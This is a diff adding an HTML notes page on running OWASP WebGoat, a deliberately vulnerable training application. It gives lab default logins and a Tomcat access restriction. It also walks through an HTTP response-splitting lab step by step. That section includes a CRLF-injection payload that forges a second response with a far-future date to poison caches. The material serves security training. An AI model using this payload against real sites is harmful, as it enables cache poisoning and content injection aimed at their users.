@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head>
+<link rel="Stylesheet" type="text/css" href="css/style.css">
+<title>WebGoat</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+
+<div id="WebGoat"><h1 id="WebGoat" class="header"><a href="#WebGoat">WebGoat</a></h1></div>
+
+<div id="WebGoat-OWASP WebGoat"><h2 id="OWASP WebGoat" class="header"><a href="#WebGoat-OWASP WebGoat">OWASP WebGoat</a></h2></div>
+<p>
+To start webgoal 6.0.1:
+$ java -jar WebGoat-6.0.1-war-exec.jar -httpPort 9090
+</p>
+
+
+<ul>
+<li>
+on linux <code>webgoat.sh start80</code> or <code>webgoat.sh start8080</code>
+
+<li>
+user: guest password: guest
+
+<li>
+config file is at /var/lib/tomcat/conf server_80.xml &lt;?&gt;
+
+<ul>
+<li>
+Add these lines to the Host section.
+<pre>
+      	&lt;Valve className="org.apache.catalina.valves.RemoteAddrValve"
+	    allow="127.0.0.1,ip1,ip2"/&gt;
+</pre>
+        nb: this means that only localhost,ip1 and ip2 are permitted to connect.
+
+</ul>
+<li>
+other accounts, u:webgoat p:webgoat, u:basic p:basic, u:guest p:guest
+
+</ul>
+
+<div id="WebGoat-OWASP WebGoat-HttpSplitting"><h3 id="HttpSplitting" class="header"><a href="#WebGoat-OWASP WebGoat-HttpSplitting">HttpSplitting</a></h3></div>
+<p>
+This is done with the use of %0d '\r' and %0a '\n'.  If server allows
+it, you can Input url encoded string using the above.
+</p>
+
+<p>
+In your Input, say a Searchbox:
+</p>
+
+<ol>
+<li>
+Make a txt files with:  Delete the comments before doing.
+<pre>
+    en                  # &lt;- this is the 'normal' text.
+    Content-Length: 0
+    
+    HTTP/1.1 200 OK
+    Content-Type: text/html
+    Last-Modified: Mon, 29 Apr 2099 03:45:18 GMT   # &lt;- cache poisoning.
+    Content-Length: 34
+    &lt;html&gt;HTTP Splitting Test&lt;/html&gt;
+</pre>
+
+</ol>
+
+<ol>
+<li>
+Then can goto <a href="http://yehg.net/encoding/">http://yehg.net/encoding/</a> to URL Encode it.
+
+</ol>
+
+<ol>
+<li>
+Then cut&amp;paste that encoded string into the Input Searchbox.
+
+</ol>
+<p>
+Thats it.
+</p>
+
+</body>
+</html>
